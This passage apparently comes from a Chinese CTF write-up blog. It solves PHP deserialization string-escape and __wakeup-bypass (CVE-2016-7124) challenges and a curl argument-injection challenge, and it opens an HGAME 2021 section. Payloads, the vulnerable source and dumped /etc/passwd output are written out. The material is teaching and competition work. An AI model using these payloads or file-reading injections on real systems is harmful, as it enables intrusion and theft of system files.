--&gt; 字符串长度 +4</span><br></pre></td></tr></table></figure><p>需要的最后结果是 Hed9eh0g 的值为 has_girlfriend。因此只需要写出这样的 payload 即可成功逃逸到 Hed9eh0g。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = str_repeat(<span class="string">&quot;flag&quot;</span>, <span class="number">10</span>) . str_repeat(<span class="string">&quot;php&quot;</span>,<span class="number">1</span>) . str_repeat(<span class="string">&quot;boyfriend&quot;</span>,<span class="number">5</span>) .<span class="string">&#x27;&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&#x27;</span> ;</span><br></pre></td></tr></table></figure><p>此时序列化出来的字符串是这样的。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:3:&quot;A&amp;D&quot;;s:128:&quot;hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&quot;;s:8:&quot;Hed9eh0g&quot;;s:13:&quot;no_girlfriend&quot;;&#125;</span><br></pre></td></tr></table></figure><p>将 payload 拼接到请求中发送即可在响应中得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841035434.1f4c89da97f6005f6369a03bda02303e2934c8dc.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsctf&#123;i_Lov3_nEws4tF_wEb&#125;</span><br></pre></td></tr></table></figure><h3 id="EZ套娃"><a href="#EZ套娃" class="headerlink" title="EZ套娃"></a>EZ套娃</h3><p>第一步是代码审计拿 hint，给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;hint)); </span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line">unserialize(read(write(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>主要的考点是字符多变字符少的反序列化字符逃逸，以及 PHP 5.4.4 下的 CVE-2016-7124 即 <code>__wakeup()</code> 的绕过。于是写出如下 payload 拿到 hint。</p><blockquote><p>Fixed In Version: php 5.6.25, php 7.0.10</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = str_repeat(<span class="string">&#x27;\0\0\0&#x27;</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//It will be O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot; *  *  *  *  *  *  *  * &quot;;s:8:&quot;password&quot;;s:60:&quot;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&quot;;&#125; when serialized by the program</span></span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841218491.5440a5f5020440ae151d6f63ebd9e6801ebcbe66.png"></p><p>payload 发送之后得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo&#x3D;</span><br></pre></td></tr></table></figure><p>将其 base64 解码后可得如下 hint。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>定向到这个路由，发现是一个由 curl 发起请求的响应。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;headers&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;Host&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;User-Agent&quot;</span>: <span class="string">&quot;curl/7.64.0&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;X-Amzn-Trace-Id&quot;</span>: <span class="string">&quot;Root=1-602a67c5-2bbcf35059d5a41c03702149&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;114.67.246.176&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://httpbin.org/get?name=Bob&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时再次尝试可以发现参数 name 可控，于是尝试在其中拼接一些 curl 的参数指令。在 name 参数后面拼接 <code> file:///etc/passwd</code> 可以发现如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;lemon&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;curl&#x2F;7.64.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-602a6a25-31c02675388dc74e545082fa&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;114.67.246.176&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;lemon&quot;</span><br><span class="line">&#125;</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>于是构造出 <code>file:///flag</code>，成功得到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b07006f7bdb7be77f633298e0e1829f5&#125;</span><br></pre></td></tr></table></figure><p>同时附上这题 <code>index.cgi</code> 的源码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.cgi </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ./_dep/web.cgi</span><br><span class="line">echo_headers</span><br><span class="line"></span><br><span class="line">name=<span class="variable">$&#123;_GET[&quot;name&quot;]&#125;</span></span><br><span class="line"></span><br><span class="line">[[ <span class="variable">$name</span> == <span class="string">&quot;&quot;</span> ]] &amp;&amp; name=<span class="string">&#x27;Bob&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -v http://httpbin.org/get?name=<span class="variable">$name</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./_dep/web.cgi</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">WEBASH_VERSION=<span class="string">&#x27;0.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Some notes:</span></span><br><span class="line"><span class="comment"># - The aim is to use native bash as much as possible</span></span><br><span class="line"><span class="comment"># - printf is more secure than echo because you can&#x27;t tell echo to stop processing parameters</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make bash intolerant of errors</span></span><br><span class="line"><span class="comment"># set -ef -o pipefail</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_decode</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> data=<span class="string">&quot;<span class="variable">$&#123;*//+/ &#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%b&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;data//%/\\x&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_encode</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Modified from https://gist.github.com/cdown/1163649</span></span><br><span class="line">    old_lc_collate=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span></span><br><span class="line">    LC_COLLATE=<span class="string">&quot;C&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">local</span> length=<span class="string">&quot;<span class="variable">$&#123;#1&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (( pos = 0; pos &lt; length; pos++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">local</span> chr=<span class="string">&quot;<span class="variable">$&#123;1:pos:1&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;+&#x27;</span></span><br><span class="line">                ;;</span><br><span class="line">            [a-zA-Z0-9.~_-])</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;%%%02X&#x27;</span> <span class="string">&quot;&#x27;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    LC_COLLATE=<span class="string">&quot;<span class="variable">$old_lc_collate</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">html</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> str=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&lt;/&amp;lt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&gt;/&amp;gt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//\&quot;/&amp;quot;&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http_status_code=<span class="string">&quot;200 OK&quot;</span></span><br><span class="line"><span class="function"><span class="title">http_status</span></span>() &#123;</span><br><span class="line">    http_status_code=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A http_headers</span><br><span class="line"><span class="function"><span class="title">http_header</span></span>() &#123;</span><br><span class="line">    http_headers[<span class="string">&quot;<span class="variable">$1</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">echo_headers</span></span>() &#123;</span><br><span class="line">    http_header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=utf-8&quot;</span></span><br><span class="line">    http_header <span class="string">&quot;X-Server&quot;</span> <span class="string">&quot;webash/<span class="variable">$WEBASH_VERSION</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output headers</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$http_status_code</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!http_headers[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> </span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%s: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;http_headers[$name]&#125;</span>&quot;</span>; </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">http_error</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: 500 Internal Server Error\r\n\r\nInternal Server Error&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the query into $_GET</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$QUERY_STRING</span>&quot;</span></span><br><span class="line"><span class="built_in">declare</span> -A _GET</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _GET[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the POST into $_POST</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query</span><br><span class="line"><span class="built_in">declare</span> -A _POST</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _POST[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021</title>
      <link href="/zh-CN/posts/484ca20c.html"/>
      <url>/zh-CN/posts/484ca20c.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>index.php 内访问 HitchhikerGuide.php 可见 302 跳转，使用 BurpSuite GET 一次可以发现返回值是 405。于是尝试使用 POST 访问，得到了提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure><p>根据提示设置不同请求头最终可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397284391566.58032d58806ed0125c5d55b67be68b8e13b06f7e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!&#125;</span><br></pre></td></tr></table></figure><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>稍微修改一下 <code>Math.random = function()&#123;return 0.5;&#125;</code> 使得所有水果都是橙子，同时把屏幕调窄。玩到 2000 分之后再把返回值设定为 1.8 使水果变为半个西瓜从而快速填充屏幕输掉这局比赛。如此即可拿到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397285255369.36fcffeea8fe03cdcb507790be3dc6e395c8d429.png"></p><h4 id="代码审计法"><a href="#代码审计法" class="headerlink" title="代码审计法"></a>代码审计法</h4><p>合成大西瓜是使用 cocos 引擎开发的游戏，那么其核心部分一定在 <code>.../src/project.js</code>。游戏在结束后会放出 flag，因此搜索出 gameover 